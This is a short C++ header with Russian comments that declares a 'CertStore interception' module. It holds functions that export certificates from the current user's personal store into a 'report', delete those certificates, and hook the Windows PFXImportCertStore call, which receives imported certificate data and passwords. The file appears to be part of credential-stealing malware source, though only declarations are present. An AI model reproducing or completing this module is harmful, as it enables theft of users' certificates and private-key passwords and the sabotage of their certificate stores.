/*
  Перехват CertStore.
*/
#pragma once

namespace CertStoreHook
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);
  
  /*
    Получение сертфикатов из текущего MY-хранилища пользователя.

    Return - true - если хранилище успещно прочитано и записано в отчет, если сертифкатов > 0.
             true - если хранилище успещно прочитано и если сертифкатов == 0.
             false - в случаи ошибки.
  */
  bool _exportMy(void);

  /*
    Удаление сертфикатов из текущего MY-хранилища пользователя.      

    Return - true - в случаи успеха,
             false - в случаи ошибки.
  */
  bool _clearMy(void);
  
  /*
    Перехватчик PFXImportCertStore.
  */
  void * WINAPI _hookerPfxImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR password, DWORD flags);
};
